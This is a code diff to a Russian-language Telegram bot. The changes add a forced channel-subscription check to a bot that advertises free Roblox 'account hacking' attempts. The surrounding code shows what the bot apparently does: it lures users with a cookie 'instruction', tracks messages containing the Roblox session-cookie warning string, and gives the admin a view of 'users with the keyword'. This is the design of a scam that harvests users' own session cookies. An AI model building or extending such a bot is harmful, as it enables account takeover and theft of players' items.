@@ -11,6 +11,10 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 # ⚠️ ТВОЙ ID АДМИНИСТРАТОРА (ТОЛЬКО ТЫ ВИДИШЬ АДМИНСКИЕ КНОПКИ)
 YOUR_USER_ID = 1341594703
 
+# ⚠️ НАСТРОЙКИ ПОДПИСКИ
+REQUIRED_CHANNEL = "@reviewsh1pe"  # Канал для обязательной подписки
+CHANNEL_ID = None  # Можно оставить None, бот будет использовать username
+
 # ===================================================
 # ФАЙЛЫ ДЛЯ ХРАНЕНИЯ ДАННЫХ
 # ===================================================
@@ -22,6 +26,55 @@ ATTEMPTS_FILE = "attempts.json"
 REFERRALS_FILE = "referrals.json"
 
 KEYWORD = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"
+
+# ===================================================
+# ФУНКЦИЯ ПРОВЕРКИ ПОДПИСКИ
+# ===================================================
+
+async def check_subscription(user_id, context):
+    """Проверяет, подписан ли пользователь на канал"""
+    try:
+        # Пытаемся получить статус участника
+        chat_member = await context.bot.get_chat_member(
+            chat_id=REQUIRED_CHANNEL,
+            user_id=user_id
+        )
+        # Проверяем статус: creator, administrator, member - считаются подписанными
+        return chat_member.status in ['creator', 'administrator', 'member']
+    except Exception as e:
+        print(f"Ошибка проверки подписки для {user_id}: {e}")
+        # Если ошибка (например, бот не админ в канале), пропускаем проверку
+        return True
+
+async def check_subscription_and_continue(update, context):
+    """Проверяет подписку и если не подписан - показывает кнопку"""
+    user_id = update.effective_user.id
+    
+    # Для админа проверку не делаем
+    if user_id == YOUR_USER_ID:
+        return True
+    
+    is_subscribed = await check_subscription(user_id, context)
+    
+    if not is_subscribed:
+        keyboard = [
+            [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/reviewsh1pe")],
+            [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(
+            "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n"
+            "1️⃣ Нажмите кнопку ниже\n"
+            "2️⃣ Подпишитесь на канал\n"
+            "3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n"
+            "🔗 **Канал:** @reviewsh1pe",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+        return False
+    
+    return True
 
 # ===================================================
 # ФУНКЦИИ ДЛЯ РАБОТЫ С ПОПЫТКАМИ И РЕФЕРАЛАМИ
@@ -624,8 +677,29 @@ async def execute_give_all_zero(query: Update, context: ContextTypes.DEFAULT_TYP
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    user_name = user.first_name
     user_id = user.id
+    
+    # Проверяем подписку для обычных пользователей
+    if user_id != YOUR_USER_ID:
+        is_subscribed = await check_subscription(user_id, context)
+        if not is_subscribed:
+            keyboard = [
+                [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/reviewsh1pe")],
+                [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text(
+                "⚠️ **Для использования бота необходимо подписаться на наш канал!**\n\n"
+                "1️⃣ Нажмите кнопку ниже\n"
+                "2️⃣ Подпишитесь на канал\n"
+                "3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n"
+                "🔗 **Канал:** @reviewsh1pe",
+                reply_markup=reply_markup,
+                parse_mode='Markdown'
+            )
+            return
+    
+    user_name = user.first_name
     
     referrer_id = None
     if context.args and context.args[0].startswith('ref_'):
@@ -702,6 +776,70 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_admin = (user_id == YOUR_USER_ID)
     data = query.data
     
+    # --- ПРОВЕРКА ПОДПИСКИ ---
+    if data == "check_subscription":
+        is_subscribed = await check_subscription(user_id, context)
+        if is_subscribed:
+            # Если подписан - показываем меню
+            user_name = update.effective_user.first_name
+            attempts = get_user_attempts(user_id)
+            referrals = get_referral_count(user_id)
+            
+            keyboard = [
+                [
+                    InlineKeyboardButton("Взломать аккаунт", callback_data="device"),
+                    InlineKeyboardButton("Инструкция", callback_data="cookies"),
+                ],
+                [
+                    InlineKeyboardButton("👥 Пригласить друга", callback_data="referral"),
+                    InlineKeyboardButton("💰 Купить Roblox", callback_data="buy_roblox"),
+                ]
+            ]
+            
+            if user_id == YOUR_USER_ID:
+                keyboard.append([
+                    InlineKeyboardButton("👥 Все пользователи", callback_data="view_all_users"),
+                    InlineKeyboardButton("🔑 С ключевым словом", callback_data="view_keyword_users_only"),
+                ])
+                keyboard.append([
+                    InlineKeyboardButton("📊 Статистика", callback_data="view_stats"),
+                    InlineKeyboardButton("💬 Чат с пользователем", callback_data="select_user_for_chat"),
+                ])
+                keyboard.append([
+                    InlineKeyboardButton("🎯 Выдать попытки", callback_data="give_attempts_menu"),
+                    InlineKeyboardButton("📨 Рассылка", callback_data="send_mailing"),
+                ])
+                keyboard.append([
+                    InlineKeyboardButton("🗑 Удалить пользователей", callback_data="delete_users_menu"),
+                ])
+            
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(
+                f"Привет, {user_name}! 👋\n\n"
+                f"🎯 **У тебя {attempts} бесплатная попытка взлома**\n"
+                f"👥 Приглашено друзей: {referrals}\n"
+                f"🔑 За каждого друга +1 попытка\n\n"
+                f"Выбери нужную категорию:",
+                reply_markup=reply_markup
+            )
+        else:
+            # Если не подписан - показываем сообщение с кнопкой
+            keyboard = [
+                [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/reviewsh1pe")],
+                [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(
+                "❌ **Вы ещё не подписались на канал!**\n\n"
+                "1️⃣ Нажмите кнопку ниже\n"
+                "2️⃣ Подпишитесь на канал\n"
+                "3️⃣ Вернитесь в бота и нажмите '✅ Я ПОДПИСАЛСЯ'\n\n"
+                "🔗 **Канал:** @reviewsh1pe",
+                reply_markup=reply_markup,
+                parse_mode='Markdown'
+            )
+        return
+    
     # --- ПОКУПКА ROBLOX ---
     if data == "buy_roblox":
         keyboard = [
@@ -755,6 +893,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # --- ОБЫЧНЫЕ КНОПКИ (ДОСТУПНЫ ВСЕМ) ---
     if data == "device":
+        # Проверяем подписку перед использованием
+        if user_id != YOUR_USER_ID:
+            is_subscribed = await check_subscription(user_id, context)
+            if not is_subscribed:
+                keyboard = [
+                    [InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/reviewsh1pe")],
+                    [InlineKeyboardButton("✅ Я ПОДПИСАЛСЯ", callback_data="check_subscription")]
+                ]
+                reply_markup = InlineKeyboardMarkup(keyboard)
+                await query.edit_message_text(
+                    "❌ **Для использования бота подпишитесь на канал!**\n\n"
+                    "🔗 **Канал:** @reviewsh1pe",
+                    reply_markup=reply_markup,
+                    parse_mode='Markdown'
+                )
+                return
+        
         attempts = get_user_attempts(user_id)
         
         if attempts <= 0:
@@ -1562,6 +1717,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
     print("🤖 Бот запущен! Нажмите Ctrl+C для остановки.")
+    print("📢 Обязательная подписка: @reviewsh1pe")
     print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
     print("🎯 У каждого пользователя 1 бесплатная попытка")
     print("👥 За каждого приглашенного друга +1 попытка")
